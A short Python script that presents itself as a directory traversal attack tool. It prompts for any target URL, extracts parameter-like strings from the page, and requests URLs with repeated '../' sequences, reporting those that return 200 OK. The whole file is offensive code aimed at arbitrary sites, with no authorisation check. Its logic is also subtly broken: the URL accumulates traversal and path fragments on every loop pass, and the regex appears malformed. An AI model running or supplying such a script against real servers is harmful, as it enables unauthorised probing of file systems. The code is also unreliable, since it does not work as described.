#!/usr/bin/env python3
"""
This script performs a directory traversal attack on a target URL specified by the user.
It prompts the user for the target URL, validates the input, and performs the attack using
a specified number of traversal levels. It displays progress messages and only prints valid
URLs that return a 200 OK response.
"""

import requests
import validators
import re

# Prompt the user for the target URL
while True:
    url = input("Please enter the target URL: ")
    if validators.url(url):
        break
    else:
        print("Invalid URL. Please try again.")

# Prompt the user for the number of traversal levels
while True:
    num_levels = input("Please enter the number of traversal levels (default: 20): ")
    if num_levels == "":
        num_levels = 20
        break
    elif num_levels.isnumeric():
        num_levels = int(num_levels)
        break
    else:
        print("Invalid input. Please enter a numeric value or leave blank for default.")

# Perform the directory traversal attack
response = requests.get(url)

file_paths = re.findall('"((?:\\.|[^"\\])*)"', response.text)

num_valid_urls = 0

for path in file_paths:
    if "=" in path:
        for i in range(num_levels):
            url = url + "../"
            url += path
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    print(url)
                    num_valid_urls += 1
                else:
                    break
            except requests.exceptions.RequestException as e:
                print("An error occurred:", e)
                break

# Display a summary of the results
print(f"Directory traversal attack complete. Found {num_valid_urls} valid URLs.")
